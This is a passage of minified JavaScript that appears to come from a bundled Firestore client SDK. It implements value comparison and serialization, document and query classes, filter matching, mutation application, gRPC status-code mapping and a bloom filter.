u=r.fields||{},d=l.fields||{},p=u[dh]?.arrayValue,f=d[dh]?.arrayValue,h=da(p?.values?.length||0,f?.values?.length||0);return h!==0?h:$A(p,f)})(a.mapValue,e.mapValue);case 11:return(function(r,l){if(r===bf.mapValue&&l===bf.mapValue)return 0;if(r===bf.mapValue)return 1;if(l===bf.mapValue)return-1;const u=r.fields||{},d=Object.keys(u),p=l.fields||{},f=Object.keys(p);d.sort(),f.sort();for(let h=0;h<d.length&&h<f.length;++h){const E=$y(d[h],f[h]);if(E!==0)return E;const C=jc(u[d[h]],p[f[h]]);if(C!==0)return C}return da(d.length,f.length)})(a.mapValue,e.mapValue);default:throw Ge(23264,{he:t})}}function YA(a,e){if(typeof a=="string"&&typeof e=="string"&&a.length===e.length)return da(a,e);const t=Xs(a),n=Xs(e),i=da(t.seconds,n.seconds);return i!==0?i:da(t.nanos,n.nanos)}function $A(a,e){const t=a.values||[],n=e.values||[];for(let i=0;i<t.length&&i<n.length;++i){const r=jc(t[i],n[i]);if(r)return r}return da(t.length,n.length)}function Dc(a){return Xy(a)}function Xy(a){return"nullValue"in a?"null":"booleanValue"in a?""+a.booleanValue:"integerValue"in a?""+a.integerValue:"doubleValue"in a?""+a.doubleValue:"timestampValue"in a?(function(t){const n=Xs(t);return`time(${n.seconds},${n.nanos})`})(a.timestampValue):"stringValue"in a?a.stringValue:"bytesValue"in a?(function(t){return Zs(t).toBase64()})(a.bytesValue):"referenceValue"in a?(function(t){return Be.fromName(t).toString()})(a.referenceValue):"geoPointValue"in a?(function(t){return`geo(${t.latitude},${t.longitude})`})(a.geoPointValue):"arrayValue"in a?(function(t){let n="[",i=!0;for(const r of t.values||[])i?i=!1:n+=",",n+=Xy(r);return n+"]"})(a.arrayValue):"mapValue"in a?(function(t){const n=Object.keys(t.fields||{}).sort();let i="{",r=!0;for(const l of n)r?r=!1:i+=",",i+=`${l}:${Xy(t.fields[l])}`;return i+"}"})(a.mapValue):Ge(61005,{value:a})}function _f(a){switch(er(a)){case 0:case 1:return 4;case 2:return 8;case 3:case 8:return 16;case 4:const e=Kh(a);return e?16+_f(e):16;case 5:return 2*a.stringValue.length;case 6:return Zs(a.bytesValue).approximateByteSize();case 7:return a.referenceValue.length;case 9:return(function(n){return(n.values||[]).reduce(((i,r)=>i+_f(r)),0)})(a.arrayValue);case 10:case 11:return(function(n){let i=0;return dl(n.fields,((r,l)=>{i+=r.length+_f(l)})),i})(a.mapValue);default:throw Ge(13486,{value:a})}}function Zy(a){return!!a&&"integerValue"in a}function SE(a){return!!a&&"arrayValue"in a}function XA(a){return!!a&&"nullValue"in a}function ZA(a){return!!a&&"doubleValue"in a&&isNaN(Number(a.doubleValue))}function qf(a){return!!a&&"mapValue"in a}function D5(a){return(a?.mapValue?.fields||{})[OI]?.stringValue===UI}function jd(a){if(a.geoPointValue)return{geoPointValue:{...a.geoPointValue}};if(a.timestampValue&&typeof a.timestampValue=="object")return{timestampValue:{...a.timestampValue}};if(a.mapValue){const e={mapValue:{fields:{}}};return dl(a.mapValue.fields,((t,n)=>e.mapValue.fields[t]=jd(n))),e}if(a.arrayValue){const e={arrayValue:{values:[]}};for(let t=0;t<(a.arrayValue.values||[]).length;++t)e.arrayValue.values[t]=jd(a.arrayValue.values[t]);return e}return{...a}}function M5(a){return(((a.mapValue||{}).fields||{}).__type__||{}).stringValue===j5}class Yn{constructor(e){this.value=e}static empty(){return new Yn({mapValue:{}})}field(e){if(e.isEmpty())return this.value;{let t=this.value;for(let n=0;n<e.length-1;++n)if(t=(t.mapValue.fields||{})[e.get(n)],!qf(t))return null;return t=(t.mapValue.fields||{})[e.lastSegment()],t||null}}set(e,t){this.getFieldsMap(e.popLast())[e.lastSegment()]=jd(t)}setAll(e){let t=Ot.emptyPath(),n={},i=[];e.forEach(((l,u)=>{if(!t.isImmediateParentOf(u)){const d=this.getFieldsMap(t);this.applyChanges(d,n,i),n={},i=[],t=u.popLast()}l?n[u.lastSegment()]=jd(l):i.push(u.lastSegment())}));const r=this.getFieldsMap(t);this.applyChanges(r,n,i)}delete(e){const t=this.field(e.popLast());qf(t)&&t.mapValue.fields&&delete t.mapValue.fields[e.lastSegment()]}isEqual(e){return lo(this.value,e.value)}getFieldsMap(e){let t=this.value;t.mapValue.fields||(t.mapValue={fields:{}});for(let n=0;n<e.length;++n){let i=t.mapValue.fields[e.get(n)];qf(i)&&i.mapValue.fields||(i={mapValue:{fields:{}}},t.mapValue.fields[e.get(n)]=i),t=i}return t.mapValue.fields}applyChanges(e,t,n){dl(t,((i,r)=>e[i]=r));for(const i of n)delete e[i]}clone(){return new Yn(jd(this.value))}}function zI(a){const e=[];return dl(a.fields,((t,n)=>{const i=new Ot([t]);if(qf(n)){const r=zI(n.mapValue).fields;if(r.length===0)e.push(i);else for(const l of r)e.push(i.child(l))}else e.push(i)})),new bi(e)}class Ht{constructor(e,t,n,i,r,l,u){this.key=e,this.documentType=t,this.version=n,this.readTime=i,this.createTime=r,this.data=l,this.documentState=u}static newInvalidDocument(e){return new Ht(e,0,Ke.min(),Ke.min(),Ke.min(),Yn.empty(),0)}static newFoundDocument(e,t,n,i){return new Ht(e,1,t,Ke.min(),n,i,0)}static newNoDocument(e,t){return new Ht(e,2,t,Ke.min(),Ke.min(),Yn.empty(),0)}static newUnknownDocument(e,t){return new Ht(e,3,t,Ke.min(),Ke.min(),Yn.empty(),2)}convertToFoundDocument(e,t){return!this.createTime.isEqual(Ke.min())||this.documentType!==2&&this.documentType!==0||(this.createTime=e),this.version=e,this.documentType=1,this.data=t,this.documentState=0,this}convertToNoDocument(e){return this.version=e,this.documentType=2,this.data=Yn.empty(),this.documentState=0,this}convertToUnknownDocument(e){return this.version=e,this.documentType=3,this.data=Yn.empty(),this.documentState=2,this}setHasCommittedMutations(){return this.documentState=2,this}setHasLocalMutations(){return this.documentState=1,this.version=Ke.min(),this}setReadTime(e){return this.readTime=e,this}get hasLocalMutations(){return this.documentState===1}get hasCommittedMutations(){return this.documentState===2}get hasPendingWrites(){return this.hasLocalMutations||this.hasCommittedMutations}isValidDocument(){return this.documentType!==0}isFoundDocument(){return this.documentType===1}isNoDocument(){return this.documentType===2}isUnknownDocument(){return this.documentType===3}isEqual(e){return e instanceof Ht&&this.key.isEqual(e.key)&&this.version.isEqual(e.version)&&this.documentType===e.documentType&&this.documentState===e.documentState&&this.data.isEqual(e.data)}mutableCopy(){return new Ht(this.key,this.documentType,this.version,this.readTime,this.createTime,this.data.clone(),this.documentState)}toString(){return`Document(${this.key}, ${this.version}, ${JSON.stringify(this.data.value)}, {createTime: ${this.createTime}}), {documentType: ${this.documentType}}), {documentState: ${this.documentState}})`}}class ph{constructor(e,t){this.position=e,this.inclusive=t}}function e2(a,e,t){let n=0;for(let i=0;i<a.position.length;i++){const r=e[i],l=a.position[i];if(r.field.isKeyField()?n=Be.comparator(Be.fromName(l.referenceValue),t.key):n=jc(l,t.data.field(r.field)),r.dir==="desc"&&(n*=-1),n!==0)break}return n}function a2(a,e){if(a===null)return e===null;if(e===null||a.inclusive!==e.inclusive||a.position.length!==e.position.length)return!1;for(let t=0;t<a.position.length;t++)if(!lo(a.position[t],e.position[t]))return!1;return!0}class mh{constructor(e,t="asc"){this.field=e,this.dir=t}}function N5(a,e){return a.dir===e.dir&&a.field.isEqual(e.field)}class BI{}class vt extends BI{constructor(e,t,n){super(),this.field=e,this.op=t,this.value=n}static create(e,t,n){return e.isKeyField()?t==="in"||t==="not-in"?this.createKeyFieldInFilter(e,t,n):new q5(e,t,n):t==="array-contains"?new U5(e,n):t==="in"?new z5(e,n):t==="not-in"?new B5(e,n):t==="array-contains-any"?new F5(e,n):new vt(e,t,n)}static createKeyFieldInFilter(e,t,n){return t==="in"?new k5(e,n):new O5(e,n)}matches(e){const t=e.data.field(this.field);return this.op==="!="?t!==null&&t.nullValue===void 0&&this.matchesComparison(jc(t,this.value)):t!==null&&er(this.value)===er(t)&&this.matchesComparison(jc(t,this.value))}matchesComparison(e){switch(this.op){case"<":return e<0;case"<=":return e<=0;case"==":return e===0;case"!=":return e!==0;case">":return e>0;case">=":return e>=0;default:return Ge(47266,{operator:this.op})}}isInequality(){return["<","<=",">",">=","!=","not-in"].indexOf(this.op)>=0}getFlattenedFilters(){return[this]}getFilters(){return[this]}}class co extends BI{constructor(e,t){super(),this.filters=e,this.op=t,this.Pe=null}static create(e,t){return new co(e,t)}matches(e){return FI(this)?this.filters.find((t=>!t.matches(e)))===void 0:this.filters.find((t=>t.matches(e)))!==void 0}getFlattenedFilters(){return this.Pe!==null||(this.Pe=this.filters.reduce(((e,t)=>e.concat(t.getFlattenedFilters())),[])),this.Pe}getFilters(){return Object.assign([],this.filters)}}function FI(a){return a.op==="and"}function VI(a){return _5(a)&&FI(a)}function _5(a){for(const e of a.filters)if(e instanceof co)return!1;return!0}function e0(a){if(a instanceof vt)return a.field.canonicalString()+a.op.toString()+Dc(a.value);if(VI(a))return a.filters.map((e=>e0(e))).join(",");{const e=a.filters.map((t=>e0(t))).join(",");return`${a.op}(${e})`}}function HI(a,e){return a instanceof vt?(function(n,i){return i instanceof vt&&n.op===i.op&&n.field.isEqual(i.field)&&lo(n.value,i.value)})(a,e):a instanceof co?(function(n,i){return i instanceof co&&n.op===i.op&&n.filters.length===i.filters.length?n.filters.reduce(((r,l,u)=>r&&HI(l,i.filters[u])),!0):!1})(a,e):void Ge(19439)}function GI(a){return a instanceof vt?(function(t){return`${t.field.canonicalString()} ${t.op} ${Dc(t.value)}`})(a):a instanceof co?(function(t){return t.op.toString()+" {"+t.getFilters().map(GI).join(" ,")+"}"})(a):"Filter"}class q5 extends vt{constructor(e,t,n){super(e,t,n),this.key=Be.fromName(n.referenceValue)}matches(e){const t=Be.comparator(e.key,this.key);return this.matchesComparison(t)}}class k5 extends vt{constructor(e,t){super(e,"in",t),this.keys=QI("in",t)}matches(e){return this.keys.some((t=>t.isEqual(e.key)))}}class O5 extends vt{constructor(e,t){super(e,"not-in",t),this.keys=QI("not-in",t)}matches(e){return!this.keys.some((t=>t.isEqual(e.key)))}}function QI(a,e){return(e.arrayValue?.values||[]).map((t=>Be.fromName(t.referenceValue)))}class U5 extends vt{constructor(e,t){super(e,"array-contains",t)}matches(e){const t=e.data.field(this.field);return SE(t)&&ep(t.arrayValue,this.value)}}class z5 extends vt{constructor(e,t){super(e,"in",t)}matches(e){const t=e.data.field(this.field);return t!==null&&ep(this.value.arrayValue,t)}}class B5 extends vt{constructor(e,t){super(e,"not-in",t)}matches(e){if(ep(this.value.arrayValue,{nullValue:"NULL_VALUE"}))return!1;const t=e.data.field(this.field);return t!==null&&t.nullValue===void 0&&!ep(this.value.arrayValue,t)}}class F5 extends vt{constructor(e,t){super(e,"array-contains-any",t)}matches(e){const t=e.data.field(this.field);return!(!SE(t)||!t.arrayValue.values)&&t.arrayValue.values.some((n=>ep(this.value.arrayValue,n)))}}class V5{constructor(e,t=null,n=[],i=[],r=null,l=null,u=null){this.path=e,this.collectionGroup=t,this.orderBy=n,this.filters=i,this.limit=r,this.startAt=l,this.endAt=u,this.Te=null}}function t2(a,e=null,t=[],n=[],i=null,r=null,l=null){return new V5(a,e,t,n,i,r,l)}function CE(a){const e=$e(a);if(e.Te===null){let t=e.path.canonicalString();e.collectionGroup!==null&&(t+="|cg:"+e.collectionGroup),t+="|f:",t+=e.filters.map((n=>e0(n))).join(","),t+="|ob:",t+=e.orderBy.map((n=>(function(r){return r.field.canonicalString()+r.dir})(n))).join(","),Wh(e.limit)||(t+="|l:",t+=e.limit),e.startAt&&(t+="|lb:",t+=e.startAt.inclusive?"b:":"a:",t+=e.startAt.position.map((n=>Dc(n))).join(",")),e.endAt&&(t+="|ub:",t+=e.endAt.inclusive?"a:":"b:",t+=e.endAt.position.map((n=>Dc(n))).join(",")),e.Te=t}return e.Te}function TE(a,e){if(a.limit!==e.limit||a.orderBy.length!==e.orderBy.length)return!1;for(let t=0;t<a.orderBy.length;t++)if(!N5(a.orderBy[t],e.orderBy[t]))return!1;if(a.filters.length!==e.filters.length)return!1;for(let t=0;t<a.filters.length;t++)if(!HI(a.filters[t],e.filters[t]))return!1;return a.collectionGroup===e.collectionGroup&&!!a.path.isEqual(e.path)&&!!a2(a.startAt,e.startAt)&&a2(a.endAt,e.endAt)}function a0(a){return Be.isDocumentKey(a.path)&&a.collectionGroup===null&&a.filters.length===0}class Yh{constructor(e,t=null,n=[],i=[],r=null,l="F",u=null,d=null){this.path=e,this.collectionGroup=t,this.explicitOrderBy=n,this.filters=i,this.limit=r,this.limitType=l,this.startAt=u,this.endAt=d,this.Ie=null,this.Ee=null,this.Re=null,this.startAt,this.endAt}}function H5(a,e,t,n,i,r,l,u){return new Yh(a,e,t,n,i,r,l,u)}function $h(a){return new Yh(a)}function n2(a){return a.filters.length===0&&a.limit===null&&a.startAt==null&&a.endAt==null&&(a.explicitOrderBy.length===0||a.explicitOrderBy.length===1&&a.explicitOrderBy[0].field.isKeyField())}function G5(a){return Be.isDocumentKey(a.path)&&a.collectionGroup===null&&a.filters.length===0}function Q5(a){return a.collectionGroup!==null}function Dd(a){const e=$e(a);if(e.Ie===null){e.Ie=[];const t=new Set;for(const r of e.explicitOrderBy)e.Ie.push(r),t.add(r.field.canonicalString());const n=e.explicitOrderBy.length>0?e.explicitOrderBy[e.explicitOrderBy.length-1].dir:"asc";(function(l){let u=new Et(Ot.comparator);return l.filters.forEach((d=>{d.getFlattenedFilters().forEach((p=>{p.isInequality()&&(u=u.add(p.field))}))})),u})(e).forEach((r=>{t.has(r.canonicalString())||r.isKeyField()||e.Ie.push(new mh(r,n))})),t.has(Ot.keyField().canonicalString())||e.Ie.push(new mh(Ot.keyField(),n))}return e.Ie}function no(a){const e=$e(a);return e.Ee||(e.Ee=J5(e,Dd(a))),e.Ee}function J5(a,e){if(a.limitType==="F")return t2(a.path,a.collectionGroup,e,a.filters,a.limit,a.startAt,a.endAt);{e=e.map((i=>{const r=i.dir==="desc"?"asc":"desc";return new mh(i.field,r)}));const t=a.endAt?new ph(a.endAt.position,a.endAt.inclusive):null,n=a.startAt?new ph(a.startAt.position,a.startAt.inclusive):null;return t2(a.path,a.collectionGroup,e,a.filters,a.limit,t,n)}}function t0(a,e,t){return new Yh(a.path,a.collectionGroup,a.explicitOrderBy.slice(),a.filters.slice(),e,t,a.startAt,a.endAt)}function Xh(a,e){return TE(no(a),no(e))&&a.limitType===e.limitType}function JI(a){return`${CE(no(a))}|lt:${a.limitType}`}function cc(a){return`Query(target=${(function(t){let n=t.path.canonicalString();return t.collectionGroup!==null&&(n+=" collectionGroup="+t.collectionGroup),t.filters.length>0&&(n+=`, filters: [${t.filters.map((i=>GI(i))).join(", ")}]`),Wh(t.limit)||(n+=", limit: "+t.limit),t.orderBy.length>0&&(n+=`, orderBy: [${t.orderBy.map((i=>(function(l){return`${l.field.canonicalString()} (${l.dir})`})(i))).join(", ")}]`),t.startAt&&(n+=", startAt: ",n+=t.startAt.inclusive?"b:":"a:",n+=t.startAt.position.map((i=>Dc(i))).join(",")),t.endAt&&(n+=", endAt: ",n+=t.endAt.inclusive?"a:":"b:",n+=t.endAt.position.map((i=>Dc(i))).join(",")),`Target(${n})`})(no(a))}; limitType=${a.limitType})`}function Zh(a,e){return e.isFoundDocument()&&(function(n,i){const r=i.key.path;return n.collectionGroup!==null?i.key.hasCollectionId(n.collectionGroup)&&n.path.isPrefixOf(r):Be.isDocumentKey(n.path)?n.path.isEqual(r):n.path.isImmediateParentOf(r)})(a,e)&&(function(n,i){for(const r of Dd(n))if(!r.field.isKeyField()&&i.data.field(r.field)===null)return!1;return!0})(a,e)&&(function(n,i){for(const r of n.filters)if(!r.matches(i))return!1;return!0})(a,e)&&(function(n,i){return!(n.startAt&&!(function(l,u,d){const p=e2(l,u,d);return l.inclusive?p<=0:p<0})(n.startAt,Dd(n),i)||n.endAt&&!(function(l,u,d){const p=e2(l,u,d);return l.inclusive?p>=0:p>0})(n.endAt,Dd(n),i))})(a,e)}function W5(a){return a.collectionGroup||(a.path.length%2==1?a.path.lastSegment():a.path.get(a.path.length-2))}function WI(a){return(e,t)=>{let n=!1;for(const i of Dd(a)){const r=K5(i,e,t);if(r!==0)return r;n=n||i.field.isKeyField()}return 0}}function K5(a,e,t){const n=a.field.isKeyField()?Be.comparator(e.key,t.key):(function(r,l,u){const d=l.data.field(r),p=u.data.field(r);return d!==null&&p!==null?jc(d,p):Ge(42886)})(a.field,e,t);switch(a.dir){case"asc":return n;case"desc":return-1*n;default:return Ge(19790,{direction:a.dir})}}class pl{constructor(e,t){this.mapKeyFn=e,this.equalsFn=t,this.inner={},this.innerSize=0}get(e){const t=this.mapKeyFn(e),n=this.inner[t];if(n!==void 0){for(const[i,r]of n)if(this.equalsFn(i,e))return r}}has(e){return this.get(e)!==void 0}set(e,t){const n=this.mapKeyFn(e),i=this.inner[n];if(i===void 0)return this.inner[n]=[[e,t]],void this.innerSize++;for(let r=0;r<i.length;r++)if(this.equalsFn(i[r][0],e))return void(i[r]=[e,t]);i.push([e,t]),this.innerSize++}delete(e){const t=this.mapKeyFn(e),n=this.inner[t];if(n===void 0)return!1;for(let i=0;i<n.length;i++)if(this.equalsFn(n[i][0],e))return n.length===1?delete this.inner[t]:n.splice(i,1),this.innerSize--,!0;return!1}forEach(e){dl(this.inner,((t,n)=>{for(const[i,r]of n)e(i,r)}))}isEmpty(){return DI(this.inner)}size(){return this.innerSize}}const Y5=new Wa(Be.comparator);function Wo(){return Y5}const KI=new Wa(Be.comparator);function Ed(...a){let e=KI;for(const t of a)e=e.insert(t.key,t);return e}function YI(a){let e=KI;return a.forEach(((t,n)=>e=e.insert(t,n.overlayedDocument))),e}function Jr(){return Md()}function $I(){return Md()}function Md(){return new pl((a=>a.toString()),((a,e)=>a.isEqual(e)))}const $5=new Wa(Be.comparator),X5=new Et(Be.comparator);function pa(...a){let e=X5;for(const t of a)e=e.add(t);return e}const Z5=new Et(da);function eU(){return Z5}function xE(a,e){if(a.useProto3Json){if(isNaN(e))return{doubleValue:"NaN"};if(e===1/0)return{doubleValue:"Infinity"};if(e===-1/0)return{doubleValue:"-Infinity"}}return{doubleValue:ch(e)?"-0":e}}function XI(a){return{integerValue:""+a}}function aU(a,e){return A5(e)?XI(e):xE(a,e)}class eg{constructor(){this._=void 0}}function tU(a,e,t){return a instanceof fh?(function(i,r){const l={fields:{[_I]:{stringValue:NI},[kI]:{timestampValue:{seconds:i.seconds,nanos:i.nanoseconds}}}};return r&&EE(r)&&(r=Kh(r)),r&&(l.fields[qI]=r),{mapValue:l}})(t,e):a instanceof ap?ew(a,e):a instanceof tp?aw(a,e):(function(i,r){const l=ZI(i,r),u=i2(l)+i2(i.Ae);return Zy(l)&&Zy(i.Ae)?XI(u):xE(i.serializer,u)})(a,e)}function nU(a,e,t){return a instanceof ap?ew(a,e):a instanceof tp?aw(a,e):t}function ZI(a,e){return a instanceof hh?(function(n){return Zy(n)||(function(r){return!!r&&"doubleValue"in r})(n)})(e)?e:{integerValue:0}:null}class fh extends eg{}class ap extends eg{constructor(e){super(),this.elements=e}}function ew(a,e){const t=tw(e);for(const n of a.elements)t.some((i=>lo(i,n)))||t.push(n);return{arrayValue:{values:t}}}class tp extends eg{constructor(e){super(),this.elements=e}}function aw(a,e){let t=tw(e);for(const n of a.elements)t=t.filter((i=>!lo(i,n)));return{arrayValue:{values:t}}}class hh extends eg{constructor(e,t){super(),this.serializer=e,this.Ae=t}}function i2(a){return at(a.integerValue||a.doubleValue)}function tw(a){return SE(a)&&a.arrayValue.values?a.arrayValue.values.slice():[]}function iU(a,e){return a.field.isEqual(e.field)&&(function(n,i){return n instanceof ap&&i instanceof ap||n instanceof tp&&i instanceof tp?wc(n.elements,i.elements,lo):n instanceof hh&&i instanceof hh?lo(n.Ae,i.Ae):n instanceof fh&&i instanceof fh})(a.transform,e.transform)}class oU{constructor(e,t){this.version=e,this.transformResults=t}}class Fo{constructor(e,t){this.updateTime=e,this.exists=t}static none(){return new Fo}static exists(e){return new Fo(void 0,e)}static updateTime(e){return new Fo(e)}get isNone(){return this.updateTime===void 0&&this.exists===void 0}isEqual(e){return this.exists===e.exists&&(this.updateTime?!!e.updateTime&&this.updateTime.isEqual(e.updateTime):!e.updateTime)}}function kf(a,e){return a.updateTime!==void 0?e.isFoundDocument()&&e.version.isEqual(a.updateTime):a.exists===void 0||a.exists===e.isFoundDocument()}class ag{}function nw(a,e){if(!a.hasLocalMutations||e&&e.fields.length===0)return null;if(e===null)return a.isNoDocument()?new ow(a.key,Fo.none()):new Ep(a.key,a.data,Fo.none());{const t=a.data,n=Yn.empty();let i=new Et(Ot.comparator);for(let r of e.fields)if(!i.has(r)){let l=t.field(r);l===null&&r.length>1&&(r=r.popLast(),l=t.field(r)),l===null?n.delete(r):n.set(r,l),i=i.add(r)}return new ml(a.key,n,new bi(i.toArray()),Fo.none())}}function sU(a,e,t){a instanceof Ep?(function(i,r,l){const u=i.value.clone(),d=s2(i.fieldTransforms,r,l.transformResults);u.setAll(d),r.convertToFoundDocument(l.version,u).setHasCommittedMutations()})(a,e,t):a instanceof ml?(function(i,r,l){if(!kf(i.precondition,r))return void r.convertToUnknownDocument(l.version);const u=s2(i.fieldTransforms,r,l.transformResults),d=r.data;d.setAll(iw(i)),d.setAll(u),r.convertToFoundDocument(l.version,d).setHasCommittedMutations()})(a,e,t):(function(i,r,l){r.convertToNoDocument(l.version).setHasCommittedMutations()})(0,e,t)}function Nd(a,e,t,n){return a instanceof Ep?(function(r,l,u,d){if(!kf(r.precondition,l))return u;const p=r.value.clone(),f=r2(r.fieldTransforms,d,l);return p.setAll(f),l.convertToFoundDocument(l.version,p).setHasLocalMutations(),null})(a,e,t,n):a instanceof ml?(function(r,l,u,d){if(!kf(r.precondition,l))return u;const p=r2(r.fieldTransforms,d,l),f=l.data;return f.setAll(iw(r)),f.setAll(p),l.convertToFoundDocument(l.version,f).setHasLocalMutations(),u===null?null:u.unionWith(r.fieldMask.fields).unionWith(r.fieldTransforms.map((h=>h.field)))})(a,e,t,n):(function(r,l,u){return kf(r.precondition,l)?(l.convertToNoDocument(l.version).setHasLocalMutations(),null):u})(a,e,t)}function rU(a,e){let t=null;for(const n of a.fieldTransforms){const i=e.data.field(n.field),r=ZI(n.transform,i||null);r!=null&&(t===null&&(t=Yn.empty()),t.set(n.field,r))}return t||null}function o2(a,e){return a.type===e.type&&!!a.key.isEqual(e.key)&&!!a.precondition.isEqual(e.precondition)&&!!(function(n,i){return n===void 0&&i===void 0||!(!n||!i)&&wc(n,i,((r,l)=>iU(r,l)))})(a.fieldTransforms,e.fieldTransforms)&&(a.type===0?a.value.isEqual(e.value):a.type!==1||a.data.isEqual(e.data)&&a.fieldMask.isEqual(e.fieldMask))}class Ep extends ag{constructor(e,t,n,i=[]){super(),this.key=e,this.value=t,this.precondition=n,this.fieldTransforms=i,this.type=0}getFieldMask(){return null}}class ml extends ag{constructor(e,t,n,i,r=[]){super(),this.key=e,this.data=t,this.fieldMask=n,this.precondition=i,this.fieldTransforms=r,this.type=1}getFieldMask(){return this.fieldMask}}function iw(a){const e=new Map;return a.fieldMask.fields.forEach((t=>{if(!t.isEmpty()){const n=a.data.field(t);e.set(t,n)}})),e}function s2(a,e,t){const n=new Map;Aa(a.length===t.length,32656,{Ve:t.length,de:a.length});for(let i=0;i<t.length;i++){const r=a[i],l=r.transform,u=e.data.field(r.field);n.set(r.field,nU(l,u,t[i]))}return n}function r2(a,e,t){const n=new Map;for(const i of a){const r=i.transform,l=t.data.field(i.field);n.set(i.field,tU(r,l,e))}return n}class ow extends ag{constructor(e,t){super(),this.key=e,this.precondition=t,this.type=2,this.fieldTransforms=[]}getFieldMask(){return null}}class lU extends ag{constructor(e,t){super(),this.key=e,this.precondition=t,this.type=3,this.fieldTransforms=[]}getFieldMask(){return null}}class cU{constructor(e,t,n,i){this.batchId=e,this.localWriteTime=t,this.baseMutations=n,this.mutations=i}applyToRemoteDocument(e,t){const n=t.mutationResults;for(let i=0;i<this.mutations.length;i++){const r=this.mutations[i];r.key.isEqual(e.key)&&sU(r,e,n[i])}}applyToLocalView(e,t){for(const n of this.baseMutations)n.key.isEqual(e.key)&&(t=Nd(n,e,t,this.localWriteTime));for(const n of this.mutations)n.key.isEqual(e.key)&&(t=Nd(n,e,t,this.localWriteTime));return t}applyToLocalDocumentSet(e,t){const n=$I();return this.mutations.forEach((i=>{const r=e.get(i.key),l=r.overlayedDocument;let u=this.applyToLocalView(l,r.mutatedFields);u=t.has(i.key)?null:u;const d=nw(l,u);d!==null&&n.set(i.key,d),l.isValidDocument()||l.convertToNoDocument(Ke.min())})),n}keys(){return this.mutations.reduce(((e,t)=>e.add(t.key)),pa())}isEqual(e){return this.batchId===e.batchId&&wc(this.mutations,e.mutations,((t,n)=>o2(t,n)))&&wc(this.baseMutations,e.baseMutations,((t,n)=>o2(t,n)))}}class AE{constructor(e,t,n,i){this.batch=e,this.commitVersion=t,this.mutationResults=n,this.docVersions=i}static from(e,t,n){Aa(e.mutations.length===n.length,58842,{me:e.mutations.length,fe:n.length});let i=(function(){return $5})();const r=e.mutations;for(let l=0;l<r.length;l++)i=i.insert(r[l].key,n[l].version);return new AE(e,t,n,i)}}class uU{constructor(e,t){this.largestBatchId=e,this.mutation=t}getKey(){return this.mutation.key}isEqual(e){return e!==null&&this.mutation===e.mutation}toString(){return`Overlay{
      largestBatchId: ${this.largestBatchId},
      mutation: ${this.mutation.toString()}
    }`}}class dU{constructor(e,t){this.count=e,this.unchangedNames=t}}var dt,ga;function pU(a){switch(a){case Se.OK:return Ge(64938);case Se.CANCELLED:case Se.UNKNOWN:case Se.DEADLINE_EXCEEDED:case Se.RESOURCE_EXHAUSTED:case Se.INTERNAL:case Se.UNAVAILABLE:case Se.UNAUTHENTICATED:return!1;case Se.INVALID_ARGUMENT:case Se.NOT_FOUND:case Se.ALREADY_EXISTS:case Se.PERMISSION_DENIED:case Se.FAILED_PRECONDITION:case Se.ABORTED:case Se.OUT_OF_RANGE:case Se.UNIMPLEMENTED:case Se.DATA_LOSS:return!0;default:return Ge(15467,{code:a})}}function sw(a){if(a===void 0)return Jo("GRPC error has no .code"),Se.UNKNOWN;switch(a){case dt.OK:return Se.OK;case dt.CANCELLED:return Se.CANCELLED;case dt.UNKNOWN:return Se.UNKNOWN;case dt.DEADLINE_EXCEEDED:return Se.DEADLINE_EXCEEDED;case dt.RESOURCE_EXHAUSTED:return Se.RESOURCE_EXHAUSTED;case dt.INTERNAL:return Se.INTERNAL;case dt.UNAVAILABLE:return Se.UNAVAILABLE;case dt.UNAUTHENTICATED:return Se.UNAUTHENTICATED;case dt.INVALID_ARGUMENT:return Se.INVALID_ARGUMENT;case dt.NOT_FOUND:return Se.NOT_FOUND;case dt.ALREADY_EXISTS:return Se.ALREADY_EXISTS;case dt.PERMISSION_DENIED:return Se.PERMISSION_DENIED;case dt.FAILED_PRECONDITION:return Se.FAILED_PRECONDITION;case dt.ABORTED:return Se.ABORTED;case dt.OUT_OF_RANGE:return Se.OUT_OF_RANGE;case dt.UNIMPLEMENTED:return Se.UNIMPLEMENTED;case dt.DATA_LOSS:return Se.DATA_LOSS;default:return Ge(39323,{code:a})}}(ga=dt||(dt={}))[ga.OK=0]="OK",ga[ga.CANCELLED=1]="CANCELLED",ga[ga.UNKNOWN=2]="UNKNOWN",ga[ga.INVALID_ARGUMENT=3]="INVALID_ARGUMENT",ga[ga.DEADLINE_EXCEEDED=4]="DEADLINE_EXCEEDED",ga[ga.NOT_FOUND=5]="NOT_FOUND",ga[ga.ALREADY_EXISTS=6]="ALREADY_EXISTS",ga[ga.PERMISSION_DENIED=7]="PERMISSION_DENIED",ga[ga.UNAUTHENTICATED=16]="UNAUTHENTICATED",ga[ga.RESOURCE_EXHAUSTED=8]="RESOURCE_EXHAUSTED",ga[ga.FAILED_PRECONDITION=9]="FAILED_PRECONDITION",ga[ga.ABORTED=10]="ABORTED",ga[ga.OUT_OF_RANGE=11]="OUT_OF_RANGE",ga[ga.UNIMPLEMENTED=12]="UNIMPLEMENTED",ga[ga.INTERNAL=13]="INTERNAL",ga[ga.UNAVAILABLE=14]="UNAVAILABLE",ga[ga.DATA_LOSS=15]="DATA_LOSS";function mU(){return new TextEncoder}const fU=new Js([4294967295,4294967295],0);function l2(a){const e=mU().encode(a),t=new CI;return t.update(e),new Uint8Array(t.digest())}function c2(a){const e=new DataView(a.buffer),t=e.getUint32(0,!0),n=e.getUint32(4,!0),i=e.getUint32(8,!0),r=e.getUint32(12,!0);return[new Js([t,n],0),new Js([i,r],0)]}class PE{constructor(e,t,n){if(this.bitmap=e,this.padding=t,this.hashCount=n,t<0||t>=8)throw new Sd(`Invalid padding: ${t}`);if(n<0)throw new Sd(`Invalid hash count: ${n}`);if(e.length>0&&this.hashCount===0)throw new Sd(`Invalid hash count: ${n}`);if(e.length===0&&t!==0)throw new Sd(`Invalid padding when bitmap length is 0: ${t}`);this.ge=8*e.length-t,this.pe=Js.fromNumber(this.ge)}ye(e,t,n){let i=e.add(t.multiply(Js.fromNumber(n)));return i.compare(fU)===1&&(i=new Js([i.getBits(0),i.getBits(1)],0)),i.modulo(this.pe).toNumber()}we(e){return!!(this.bitmap[Math.floor(e/8)]&1<<e%8)}mightContain(e){if(this.ge===0)return!1;const t=l2(e),[n,i]=c2(t);for(let r=0;r<this.hashCount;r++){const l=this.ye(n,i,r);if(!this.we(l))return!1}return!0}static create(e,t,n){const i=e%8==0?0:8-e%8,r=new Uint8Array(Math.ceil(e/8)),l=new PE(r,i,t);return n.forEach((u=>l.insert(u))),l}insert(e){if(this.ge===0)return;const t=l2(e),[n,i]=c2(t);for(let r=0;r<this.hashCount;r++){const 